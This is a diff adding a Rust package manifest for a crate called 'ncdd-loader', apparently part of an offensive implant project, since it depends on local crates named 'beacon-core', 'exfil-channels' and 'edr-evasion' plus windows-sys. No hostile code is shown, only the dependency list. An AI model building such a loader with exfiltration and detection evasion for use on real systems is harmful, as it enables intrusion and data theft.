@@ -1,0 +1,10 @@
+[package]
+name = "ncdd-loader"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+beacon-core = { path = "../beacon-core" }
+exfil-channels = { path = "../exfil-channels" }
+edr-evasion = { path = "../edr-evasion" }
+windows-sys = "0.48"
